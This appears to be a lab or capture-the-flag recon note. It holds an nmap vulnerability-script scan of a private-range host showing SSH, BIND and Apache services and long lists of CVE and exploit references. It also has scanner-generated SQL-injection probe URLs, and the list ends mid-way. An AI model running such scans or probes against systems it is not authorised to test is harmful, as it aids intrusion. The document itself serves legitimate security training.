## .152

nmap -sV -sC --script vuln 10.200.150.152

root@ip-10-112-112-145:~/Desktop# nmap -sV -sC -p- --script vuln 10.200.150.152
Starting Nmap 7.80 ( https://nmap.org ) at 2026-03-03 13:49 GMT
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.200.150.152
Host is up (0.021s latency).
Not shown: 65532 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:openbsd:openssh:8.2p1: 
|     	PACKETSTORM:173661	9.8	https://vulners.com/packetstorm/PACKETSTORM:173661	*EXPLOIT*
|     	F0979183-AE88-53B4-86CF-3AF0523F3807	9.8	https://vulners.com/githubexploit/F0979183-AE88-53B4-86CF-3AF0523F3807	*EXPLOIT*
|     	CVE-2023-38408	9.8	https://vulners.com/cve/CVE-2023-38408
|     	B8190CDB-3EB9-5631-9828-8064A1575B23	9.8	https://vulners.com/githubexploit/B8190CDB-3EB9-5631-9828-8064A1575B23	*EXPLOIT*
|     	8FC9C5AB-3968-5F3C-825E-E8DB5379A623	9.8	https://vulners.com/githubexploit/8FC9C5AB-3968-5F3C-825E-E8DB5379A623	*EXPLOIT*
|     	8AD01159-548E-546E-AA87-2DE89F3927EC	9.8	https://vulners.com/githubexploit/8AD01159-548E-546E-AA87-2DE89F3927EC	*EXPLOIT*
|     	6192C35D-F78B-5C0A-AB8D-9826A79A5320	9.8	https://vulners.com/githubexploit/6192C35D-F78B-5C0A-AB8D-9826A79A5320	*EXPLOIT*
|     	2227729D-6700-5C8F-8930-1EEAFD4B9FF0	9.8	https://vulners.com/githubexploit/2227729D-6700-5C8F-8930-1EEAFD4B9FF0	*EXPLOIT*
|     	0221525F-07F5-5790-912D-F4B9E2D1B587	9.8	https://vulners.com/githubexploit/0221525F-07F5-5790-912D-F4B9E2D1B587	*EXPLOIT*
|     	BA3887BD-F579-53B1-A4A4-FF49E953E1C0	8.1	https://vulners.com/githubexploit/BA3887BD-F579-53B1-A4A4-FF49E953E1C0	*EXPLOIT*
|     	4FB01B00-F993-5CAF-BD57-D7E290D10C1F	8.1	https://vulners.com/githubexploit/4FB01B00-F993-5CAF-BD57-D7E290D10C1F	*EXPLOIT*
|     	CVE-2020-15778	7.8	https://vulners.com/cve/CVE-2020-15778
|     	C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	7.8	https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3	*EXPLOIT*
|     	991D2CC4-0E09-5745-97A2-4917461BD6EC	7.8	https://vulners.com/githubexploit/991D2CC4-0E09-5745-97A2-4917461BD6EC	*EXPLOIT*
|     	2E719186-2FED-58A8-A150-762EFBAAA523	7.8	https://vulners.com/gitee/2E719186-2FED-58A8-A150-762EFBAAA523	*EXPLOIT*
|     	23CC97BE-7C95-513B-9E73-298C48D74432	7.8	https://vulners.com/githubexploit/23CC97BE-7C95-513B-9E73-298C48D74432	*EXPLOIT*
|     	10213DBE-F683-58BB-B6D3-353173626207	7.8	https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207	*EXPLOIT*
|     	SSV:92579	7.5	https://vulners.com/seebug/SSV:92579	*EXPLOIT*
|     	CVE-2020-12062	7.5	https://vulners.com/cve/CVE-2020-12062
|     	CNVD-2020-36277	7.5	https://vulners.com/cnvd/CNVD-2020-36277
|     	1337DAY-ID-26576	7.5	https://vulners.com/zdt/1337DAY-ID-26576*EXPLOIT*
|     	CVE-2021-28041	7.1	https://vulners.com/cve/CVE-2021-28041
|     	CVE-2021-41617	7.0	https://vulners.com/cve/CVE-2021-41617
|     	284B94FC-FD5D-5C47-90EA-47900DAD1D1E	7.0	https://vulners.com/githubexploit/284B94FC-FD5D-5C47-90EA-47900DAD1D1E	*EXPLOIT*
|     	PACKETSTORM:189283	6.8	https://vulners.com/packetstorm/PACKETSTORM:189283	*EXPLOIT*
|     	CVE-2025-26465	6.8	https://vulners.com/cve/CVE-2025-26465
|     	9D8432B9-49EC-5F45-BB96-329B1F2B2254	6.8	https://vulners.com/githubexploit/9D8432B9-49EC-5F45-BB96-329B1F2B2254	*EXPLOIT*
|     	85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0	6.8	https://vulners.com/githubexploit/85FCDCC6-9A03-597E-AB4F-FA4DAC04F8D0	*EXPLOIT*
|     	1337DAY-ID-39918	6.8	https://vulners.com/zdt/1337DAY-ID-39918*EXPLOIT*
|     	D104D2BF-ED22-588B-A9B2-3CCC562FE8C0	6.5	https://vulners.com/githubexploit/D104D2BF-ED22-588B-A9B2-3CCC562FE8C0	*EXPLOIT*
|     	CVE-2023-51385	6.5	https://vulners.com/cve/CVE-2023-51385
|     	C07ADB46-24B8-57B7-B375-9C761F4750A2	6.5	https://vulners.com/githubexploit/C07ADB46-24B8-57B7-B375-9C761F4750A2	*EXPLOIT*
|     	A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C	6.5	https://vulners.com/githubexploit/A88CDD3E-67CC-51CC-97FB-AB0CACB6B08C	*EXPLOIT*
|     	65B15AA1-2A8D-53C1-9499-69EBA3619F1C	6.5	https://vulners.com/githubexploit/65B15AA1-2A8D-53C1-9499-69EBA3619F1C	*EXPLOIT*
|     	5325A9D6-132B-590C-BDEF-0CB105252732	6.5	https://vulners.com/gitee/5325A9D6-132B-590C-BDEF-0CB105252732	*EXPLOIT*
|     	530326CF-6AB3-5643-AA16-73DC8CB44742	6.5	https://vulners.com/githubexploit/530326CF-6AB3-5643-AA16-73DC8CB44742	*EXPLOIT*
|     	CVE-2023-48795	5.9	https://vulners.com/cve/CVE-2023-48795
|     	CVE-2020-14145	5.9	https://vulners.com/cve/CVE-2020-14145
|     	CNVD-2021-25272	5.9	https://vulners.com/cnvd/CNVD-2021-25272
|     	721F040C-37BC-59E1-9433-01A2EAC2E755	5.9	https://vulners.com/githubexploit/721F040C-37BC-59E1-9433-01A2EAC2E755	*EXPLOIT*
|     	6D74A425-60A7-557A-B469-1DD96A2D8FF8	5.9	https://vulners.com/githubexploit/6D74A425-60A7-557A-B469-1DD96A2D8FF8	*EXPLOIT*
|     	CVE-2016-20012	5.3	https://vulners.com/cve/CVE-2016-20012
|     	CVE-2025-32728	4.3	https://vulners.com/cve/CVE-2025-32728
|     	CVE-2021-36368	3.7	https://vulners.com/cve/CVE-2021-36368
|     	CVE-2025-61985	3.6	https://vulners.com/cve/CVE-2025-61985
|     	CVE-2025-61984	3.6	https://vulners.com/cve/CVE-2025-61984
|     	B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150	3.6	https://vulners.com/githubexploit/B7EACB4F-A5CF-5C5A-809F-E03CCE2AB150	*EXPLOIT*
|     	4C6E2182-0E99-5626-83F6-1646DD648C57	3.6	https://vulners.com/githubexploit/4C6E2182-0E99-5626-83F6-1646DD648C57	*EXPLOIT*
|_    	PACKETSTORM:140261	0.0	https://vulners.com/packetstorm/PACKETSTORM:140261	*EXPLOIT*
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:isc:bind:9.16.1: 
|     	CVE-2021-25216	9.8	https://vulners.com/cve/CVE-2021-25216
|     	CVE-2020-8616	8.6	https://vulners.com/cve/CVE-2020-8616
|     	CNVD-2020-34454	8.6	https://vulners.com/cnvd/CNVD-2020-34454
|     	CVE-2020-8625	8.1	https://vulners.com/cve/CVE-2020-8625
|     	PACKETSTORM:180550	7.5	https://vulners.com/packetstorm/PACKETSTORM:180550	*EXPLOIT*
|     	MSF:AUXILIARY-DOS-DNS-BIND_TSIG_BADTIME-	7.5	https://vulners.com/metasploit/MSF:AUXILIARY-DOS-DNS-BIND_TSIG_BADTIME-	*EXPLOIT*
|     	FBC03933-7A65-52F3-83F4-4B2253A490B6	7.5	https://vulners.com/githubexploit/FBC03933-7A65-52F3-83F4-4B2253A490B6	*EXPLOIT*
|     	CVE-2023-6516	7.5	https://vulners.com/cve/CVE-2023-6516
|     	CVE-2023-5517	7.5	https://vulners.com/cve/CVE-2023-5517
|     	CVE-2023-50868	7.5	https://vulners.com/cve/CVE-2023-50868
|     	CVE-2023-50387	7.5	https://vulners.com/cve/CVE-2023-50387
|     	CVE-2023-4408	7.5	https://vulners.com/cve/CVE-2023-4408
|     	CVE-2023-3341	7.5	https://vulners.com/cve/CVE-2023-3341
|     	CVE-2023-2828	7.5	https://vulners.com/cve/CVE-2023-2828
|     	CVE-2022-38178	7.5	https://vulners.com/cve/CVE-2022-38178
|     	CVE-2022-38177	7.5	https://vulners.com/cve/CVE-2022-38177
|     	CVE-2022-3094	7.5	https://vulners.com/cve/CVE-2022-3094
|     	CVE-2021-25215	7.5	https://vulners.com/cve/CVE-2021-25215
|     	CVE-2020-8623	7.5	https://vulners.com/cve/CVE-2020-8623
|     	CVE-2020-8621	7.5	https://vulners.com/cve/CVE-2020-8621
|     	CVE-2020-8620	7.5	https://vulners.com/cve/CVE-2020-8620
|     	CVE-2020-8617	7.5	https://vulners.com/cve/CVE-2020-8617
|     	1337DAY-ID-34485	7.5	https://vulners.com/zdt/1337DAY-ID-34485*EXPLOIT*
|     	CVE-2021-25220	6.8	https://vulners.com/cve/CVE-2021-25220
|     	CNVD-2022-62999	6.8	https://vulners.com/cnvd/CNVD-2022-62999
|     	CVE-2021-25214	6.5	https://vulners.com/cve/CVE-2021-25214
|     	CVE-2020-8622	6.5	https://vulners.com/cve/CVE-2020-8622
|     	CVE-2022-2795	5.3	https://vulners.com/cve/CVE-2022-2795
|     	CVE-2021-25219	5.3	https://vulners.com/cve/CVE-2021-25219
|     	CNVD-2024-16843	5.3	https://vulners.com/cnvd/CNVD-2024-16843
|     	PACKETSTORM:157836	5.0	https://vulners.com/packetstorm/PACKETSTORM:157836	*EXPLOIT*
|     	CVE-2020-8619	4.9	https://vulners.com/cve/CVE-2020-8619
|     	CVE-2020-8618	4.9	https://vulners.com/cve/CVE-2020-8618
|_    	CVE-2020-8624	4.3	https://vulners.com/cve/CVE-2020-8624
1337/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-sql-injection: 
|   Possible sqli for queries:
|     http://10.200.150.152:1337/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=M%3bO%3dD%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=D%3bO%3dD%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=S%3bO%3dD%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=N%3bO%3dD%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=M%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=N%3bO%3dA%27%20OR%20sqlspider
|     http://10.200.150.152:1337/js/?C=S%3bO%3dA%27%20OR%20sqlspider
|_    http://10.200.150.152:1337/js/?C=D%3bO%3dA%27%20OR%20sqlspider
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:apache:http_server:2.4.41: 
|     	PACKETSTORM:176334	9.8	https://vulners.com/packetstorm/PACKETSTORM:176334	*EXPLOIT*
|     	PACKETSTORM:171631	9.8	https://vulners.com/packetstorm/PACKETSTORM:171631	*EXPLOIT*
|     	HTTPD:C072933AA965A86DA3E2C9172FFC1569	9.8	https://vulners.com/httpd/HTTPD:C072933AA965A86DA3E2C9172FFC1569
|     	HTTPD:A1BBCE110E077FFBF4469D4F06DB9293	9.8	https://vulners.com/httpd/HTTPD:A1BBCE110E077FFBF4469D4F06DB9293
|     	HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D	9.8	https://vulners.com/httpd/HTTPD:A09F9CEBE0B7C39EDA0480FEAEF4FE9D
|     	HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8	9.8	https://vulners.com/httpd/HTTPD:9BCBE3C14201AFC4B0F36F15CB40C0F8
|     	HTTPD:9AD76A782F4E66676719E36B64777A7A	9.8	https://vulners.com/httpd/HTTPD:9AD76A782F4E66676719E36B64777A7A
|     	HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E	9.8	https://vulners.com/httpd/HTTPD:2BE0032A6ABE7CC52906DBAAFE0E448E
|     	EDB-ID:51193	9.8	https://vulners.com/exploitdb/EDB-ID:51193	*EXPLOIT*
|     	D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52	9.8	https://vulners.com/githubexploit/D5084D51-C8DF-5CBA-BC26-ACF2E33F8E52	*EXPLOIT*
|     	CVE-2024-38476	9.8	https://vulners.com/cve/CVE-2024-38476
|     	CVE-2024-38474	9.8	https://vulners.com/cve/CVE-2024-38474
|     	CVE-2023-25690	9.8	https://vulners.com/cve/CVE-2023-25690
|     	CVE-2022-31813	9.8	https://vulners.com/cve/CVE-2022-31813
|     	CVE-2022-23943	9.8	https://vulners.com/cve/CVE-2022-23943
|     	CVE-2022-22720	9.8	https://vulners.com/cve/CVE-2022-22720
|     	CVE-2021-44790	9.8	https://vulners.com/cve/CVE-2021-44790
|     	CVE-2021-39275	9.8	https://vulners.com/cve/CVE-2021-39275
|     	CVE-2021-26691	9.8	https://vulners.com/cve/CVE-2021-26691
|     	CVE-2020-11984	9.8	https://vulners.com/cve/CVE-2020-11984
|     	CNVD-2024-36391	9.8	https://vulners.com/cnvd/CNVD-2024-36391
|     	CNVD-2024-36388	9.8	https://vulners.com/cnvd/CNVD-2024-36388
|     	CNVD-2022-51061	9.8	https://vulners.com/cnvd/CNVD-2022-51061
|     	CNVD-2022-41640	9.8	https://vulners.com/cnvd/CNVD-2022-41640
|     	CNVD-2022-03225	9.8	https://vulners.com/cnvd/CNVD-2022-03225
|     	CNVD-2021-102386	9.8	https://vulners.com/cnvd/CNVD-2021-102386
|     	CNVD-2020-46280	9.8	https://vulners.com/cnvd/CNVD-2020-46280
|     	64A540A8-D918-5BEA-8F60-987F97B27A0C	9.8	https://vulners.com/githubexploit/64A540A8-D918-5BEA-8F60-987F97B27A0C	*EXPLOIT*
|     	5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9	9.8	https://vulners.com/githubexploit/5C1BB960-90C1-5EBF-9BEF-F58BFFDFEED9	*EXPLOIT*
|     	3F17CA20-788F-5C45-88B3-E12DB2979B7B	9.8	https://vulners.com/githubexploit/3F17CA20-788F-5C45-88B3-E12DB2979B7B	*EXPLOIT*
|     	1337DAY-ID-39214	9.8	https://vulners.com/zdt/1337DAY-ID-39214*EXPLOIT*
|     	1337DAY-ID-38427	9.8	https://vulners.com/zdt/1337DAY-ID-38427*EXPLOIT*
|     	1337DAY-ID-34882	9.8	https://vulners.com/zdt/1337DAY-ID-34882*EXPLOIT*
|     	PACKETSTORM:213257	9.1	https://vulners.com/packetstorm/PACKETSTORM:213257	*EXPLOIT*
|     	HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6	9.1	https://vulners.com/httpd/HTTPD:509B04B8CC51879DD0A561AC4FDBE0A6
|     	HTTPD:2C227652EE0B3B961706AAFCACA3D1E1	9.1	https://vulners.com/httpd/HTTPD:2C227652EE0B3B961706AAFCACA3D1E1
|     	FD2EE3A5-BAEA-5845-BA35-E6889992214F	9.1	https://vulners.com/githubexploit/FD2EE3A5-BAEA-5845-BA35-E6889992214F	*EXPLOIT*
|     	FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7	9.1	https://vulners.com/githubexploit/FBC8A8BE-F00A-5B6D-832E-F99A72E7A3F7	*EXPLOIT*
|     	E606D7F4-5FA2-5907-B30E-367D6FFECD89	9.1	https://vulners.com/githubexploit/E606D7F4-5FA2-5907-B30E-367D6FFECD89	*EXPLOIT*
|     	D8A19443-2A37-5592-8955-F614504AAF45	9.1	https://vulners.com/githubexploit/D8A19443-2A37-5592-8955-F614504AAF45	*EXPLOIT*
|     	CVE-2025-23048	9.1	https://vulners.com/cve/CVE-2025-23048
|     	CVE-2024-40898	9.1	https://vulners.com/cve/CVE-2024-40898
|     	CVE-2024-38475	9.1	https://vulners.com/cve/CVE-2024-38475
|     	CVE-2022-28615	9.1	https://vulners.com/cve/CVE-2022-28615
|     	CVE-2022-22721	9.1	https://vulners.com/cve/CVE-2022-22721
|     	CNVD-2025-16610	9.1	https://vulners.com/cnvd/CNVD-2025-16610
|     	CNVD-2024-36387	9.1	https://vulners.com/cnvd/CNVD-2024-36387
|     	CNVD-2024-33814	9.1	https://vulners.com/cnvd/CNVD-2024-33814
|     	CNVD-2022-51060	9.1	https://vulners.com/cnvd/CNVD-2022-51060
|     	CNVD-2022-41638	9.1	https://vulners.com/cnvd/CNVD-2022-41638
|     	B5E74010-A082-5ECE-AB37-623A5B33FE7D	9.1	https://vulners.com/githubexploit/B5E74010-A082-5ECE-AB37-623A5B33FE7D	*EXPLOIT*
|     	5418A85B-F4B7-5BBD-B106-0800AC961C7A	9.1	https://vulners.com/githubexploit/5418A85B-F4B7-5BBD-B106-0800AC961C7A	*EXPLOIT*
|     	HTTPD:1B3D546A8500818AAC5B1359FE11A7E4	9.0	https://vulners.com/httpd/HTTPD:1B3D546A8500818AAC5B1359FE11A7E4
|     	FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	9.0	https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8	*EXPLOIT*
|     	CVE-2022-36760	9.0	https://vulners.com/cve/CVE-2022-36760
|     	CVE-2021-40438	9.0	https://vulners.com/cve/CVE-2021-40438
|     	CNVD-2023-30860	9.0	https://vulners.com/cnvd/CNVD-2023-30860
|     	CNVD-2022-03224	9.0	https://vulners.com/cnvd/CNVD-2022-03224
|     	AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C	9.0	https://vulners.com/githubexploit/AE3EF1CC-A0C3-5CB7-A6EF-4DAAAFA59C8C	*EXPLOIT*
|     	9D9B3F4D-6B5C-5377-BE39-F1C432C9E457	9.0	https://vulners.com/githubexploit/9D9B3F4D-6B5C-5377-BE39-F1C432C9E457	*EXPLOIT*
|     	8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	9.0	https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2	*EXPLOIT*
|     	7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2	9.0	https://vulners.com/githubexploit/7F48C6CF-47B2-5AF9-B6FD-1735FB2A95B2	*EXPLOIT*
|     	36618CA8-9316-59CA-B748-82F15F407C4F	9.0	https://vulners.com/githubexploit/36618CA8-9316-59CA-B748-82F15F407C4F	*EXPLOIT*
|     	3F71F065-66D4-541F-A813-9F1A2F2B1D91	8.8	https://vulners.com/githubexploit/3F71F065-66D4-541F-A813-9F1A2F2B1D91	*EXPLOIT*
|     	CVE-2025-58098	8.3	https://vulners.com/cve/CVE-2025-58098
|     	HTTPD:A7133572D328CD65C350E33F20834FAD	8.2	https://vulners.com/httpd/HTTPD:A7133572D328CD65C350E33F20834FAD
|     	CVE-2021-44224	8.2	https://vulners.com/cve/CVE-2021-44224
|     	CNVD-2021-102387	8.2	https://vulners.com/cnvd/CNVD-2021-102387
|     	B0A9E5E8-7CCC-5984-9922-A89F11D6BF38	8.2	https://vulners.com/githubexploit/B0A9E5E8-7CCC-5984-9922-A89F11D6BF38	*EXPLOIT*
|     	CVE-2024-38473	8.1	https://vulners.com/cve/CVE-2024-38473
|     	249A954E-0189-5182-AE95-31C866A057E1	8.1	https://vulners.com/githubexploit/249A954E-0189-5182-AE95-31C866A057E1	*EXPLOIT*
|     	23079A70-8B37-56D2-9D37-F638EBF7F8B5	8.1	https://vulners.com/githubexploit/23079A70-8B37-56D2-9D37-F638EBF7F8B5	*EXPLOIT*
|     	DF041B2B-2DA7-5262-AABE-9EBD2D535041	7.8	https://vulners.com/githubexploit/DF041B2B-2DA7-5262-AABE-9EBD2D535041	*EXPLOIT*
|     	PACKETSTORM:212872	7.5	https://vulners.com/packetstorm/PACKETSTORM:212872	*EXPLOIT*
|     	PACKETSTORM:211124	7.5	https://vulners.com/packetstorm/PACKETSTORM:211124	*EXPLOIT*
|     	HTTPD:F6C47B71D440F1A5B8EC9883D1516A33	7.5	https://vulners.com/httpd/HTTPD:F6C47B71D440F1A5B8EC9883D1516A33
|     	HTTPD:F1CFBC9B54DFAD0499179863D36830BB	7.5	https://vulners.com/httpd/HTTPD:F1CFBC9B54DFAD0499179863D36830BB
|     	HTTPD:CD723D45902C2E914960ED617BF64BD6	7.5	https://vulners.com/httpd/HTTPD:CD723D45902C2E914960ED617BF64BD6
|     	HTTPD:C317C7138B4A8BBD54A901D6DDDCB837	7.5	https://vulners.com/httpd/HTTPD:C317C7138B4A8BBD54A901D6DDDCB837
|     	HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F	7.5	https://vulners.com/httpd/HTTPD:C1F57FDC580B58497A5EC5B7D3749F2F
|     	HTTPD:B1B0A31C4AD388CC6C575931414173E2	7.5	https://vulners.com/httpd/HTTPD:B1B0A31C4AD388CC6C575931414173E2
|     	HTTPD:975FD708E753E143E7DFFC23510F802E	7.5	https://vulners.com/httpd/HTTPD:975FD708E753E143E7DFFC23510F802E
|     	HTTPD:8D3D8562E77EAD24FA6850949D025BC9	7.5	https://vulners.com/httpd/HTTPD:8D3D8562E77EAD24FA6850949D025BC9
|     	HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5	7.5	https://vulners.com/httpd/HTTPD:5E6BCDB2F7C53E4EDCE844709D930AF5
|     	EDB-ID:52426	7.5	https://vulners.com/exploitdb/EDB-ID:52426	*EXPLOIT*
|     	E5C174E5-D6E8-56E0-8403-D287DE52EB3F	7.5	https://vulners.com/githubexploit/E5C174E5-D6E8-56E0-8403-D287DE52EB3F	*EXPLOIT*
|     	DB6E1BBD-08B1-574D-A351-7D6BB9898A4A	7.5	https://vulners.com/githubexploit/DB6E1BBD-08B1-574D-A351-7D6BB9898A4A	*EXPLOIT*
|     	D228B59B-465A-509D-A681-012DB9348698	7.5	https://vulners.com/githubexploit/D228B59B-465A-509D-A681-012DB9348698	*EXPLOIT*
|     	CVE-2025-59775	7.5	https://vulners.com/cve/CVE-2025-59775
|     	CVE-2025-55753	7.5	https://vulners.com/cve/CVE-2025-55753
|     	CVE-2025-53020	7.5	https://vulners.com/cve/CVE-2025-53020
|     	CVE-2025-49630	7.5	https://vulners.com/cve/CVE-2025-49630
|     	CVE-2024-47252	7.5	https://vulners.com/cve/CVE-2024-47252
|     	CVE-2024-43394	7.5	https://vulners.com/cve/CVE-2024-43394
|     	CVE-2024-43204	7.5	https://vulners.com/cve/CVE-2024-43204
|     	CVE-2024-42516	7.5	https://vulners.com/cve/CVE-2024-42516
|     	CVE-2024-39573	7.5	https://vulners.com/cve/CVE-2024-39573
|     	CVE-2024-38477	7.5	https://vulners.com/cve/CVE-2024-38477
|     	CVE-2024-38472	7.5	https://vulners.com/cve/CVE-2024-38472
|     	CVE-2024-27316	7.5	https://vulners.com/cve/CVE-2024-27316
|     	CVE-2023-31122	7.5	https://vulners.com/cve/CVE-2023-31122
|     	CVE-2023-27522	7.5	https://vulners.com/cve/CVE-2023-27522
|     	CVE-2022-30556	7.5	https://vulners.com/cve/CVE-2022-30556
|     	CVE-2022-29404	7.5	https://vulners.com/cve/CVE-2022-29404
|     	CVE-2022-26377	7.5	https://vulners.com/cve/CVE-2022-26377
|     	CVE-2022-22719	7.5	https://vulners.com/cve/CVE-2022-22719
|     	CVE-2021-36160	7.5	https://vulners.com/cve/CVE-2021-36160
|     	CVE-2021-34798	7.5	https://vulners.com/cve/CVE-2021-34798
|     	CVE-2021-33193	7.5	https://vulners.com/cve/CVE-2021-33193
|     	CVE-2021-26690	7.5	https://vulners.com/cve/CVE-2021-26690
|     	CVE-2020-9490	7.5	https://vulners.com/cve/CVE-2020-9490
|     	CVE-2020-13950	7.5	https://vulners.com/cve/CVE-2020-13950
|     	CVE-2020-11993	7.5	https://vulners.com/cve/CVE-2020-11993
|     	CVE-2006-20001	7.5	https://vulners.com/cve/CVE-2006-20001
|     	CNVD-2025-30837	7.5	https://vulners.com/cnvd/CNVD-2025-30837
|     	CNVD-2025-30836	7.5	https://vulners.com/cnvd/CNVD-2025-30836
|     	CNVD-2025-16614	7.5	https://vulners.com/cnvd/CNVD-2025-16614
|     	CNVD-2025-16613	7.5	https://vulners.com/cnvd/CNVD-2025-16613
|     	CNVD-2025-16612	7.5	https://vulners.com/cnvd/CNVD-2025-16612
|     	CNVD-2025-16609	7.5	https://vulners.com/cnvd/CNVD-2025-16609
|     	CNVD-2025-16608	7.5	https://vulners.com/cnvd/CNVD-2025-16608
|     	CNVD-2025-16603	7.5	https://vulners.com/cnvd/CNVD-2025-16603
|     	CNVD-2024-36393	7.5	https://vulners.com/cnvd/CNVD-2024-36393
|     	CNVD-2024-36390	7.5	https://vulners.com/cnvd/CNVD-2024-36390
|     	CNVD-2024-36389	7.5	https://vulners.com/cnvd/CNVD-2024-36389
|     	CNVD-2024-20839	7.5	https://vulners.com/cnvd/CNVD-2024-20839
|     	CNVD-2023-93320	7.5	https://vulners.com/cnvd/CNVD-2023-93320
|     	CNVD-2023-80558	7.5	https://vulners.com/cnvd/CNVD-2023-80558
|     	CNVD-2022-53584	7.5	https://vulners.com/cnvd/CNVD-2022-53584
|     	CNVD-2022-51058	7.5	https://vulners.com/cnvd/CNVD-2022-51058
|     	CNVD-2022-41639	7.5	https://vulners.com/cnvd/CNVD-2022-41639
|     	CNVD-2022-13199	7.5	https://vulners.com/cnvd/CNVD-2022-13199
|     	CNVD-2022-03223	7.5	https://vulners.com/cnvd/CNVD-2022-03223
|     	CNVD-2022-03205	7.5	https://vulners.com/cnvd/CNVD-2022-03205
|     	CNVD-2020-46281	7.5	https://vulners.com/cnvd/CNVD-2020-46281
|     	CNVD-2020-46279	7.5	https://vulners.com/cnvd/CNVD-2020-46279
|     	CDC791CD-A414-5ABE-A897-7CFA3C2D3D29	7.5	https://vulners.com/githubexploit/CDC791CD-A414-5ABE-A897-7CFA3C2D3D29	*EXPLOIT*
|     	BD3652A9-D066-57BA-9943-4E34970463B9	7.5	https://vulners.com/githubexploit/BD3652A9-D066-57BA-9943-4E34970463B9	*EXPLOIT*
|     	B0208442-6E17-5772-B12D-B5BE30FA5540	7.5	https://vulners.com/githubexploit/B0208442-6E17-5772-B12D-B5BE30FA5540	*EXPLOIT*
